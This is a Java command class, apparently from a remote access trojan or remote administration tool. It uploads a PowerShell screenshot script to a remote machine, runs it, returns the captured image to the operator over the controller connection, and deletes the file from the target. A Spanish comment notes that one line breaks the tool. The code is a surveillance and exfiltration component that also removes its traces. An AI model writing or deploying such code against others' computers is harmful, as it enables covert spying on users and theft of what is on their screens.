package commands;

import java.io.File;
import java.io.IOException;

import connection.Controller;

public class ScreenShotCommand extends Command{

	public ScreenShotCommand() {
		super("screenshot");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.receiveFile("Take-ScreenShot.ps1");
		// ESTO ES LO Q HACE Q NO FUNCIONE NADA :/
		ctrl.execute(". .\\Take-ScreenShot.ps1");
		String path = ctrl.execute("Get-Location");
		path = path.split("\n")[3];
		path = path + "\\";
		path = path.replace("[", "`[");
		path = path.replace("]", "`]");
		ctrl.execute("Take-ScreenShot -file \"" + path + "screenshot.png\"");
		ctrl.sendMsg("Screenshot taken");
		File screenshot = new File("screenshot.png");
		ctrl.sendFile(screenshot);
		ctrl.execute("rm screenshot.png");
	}

}
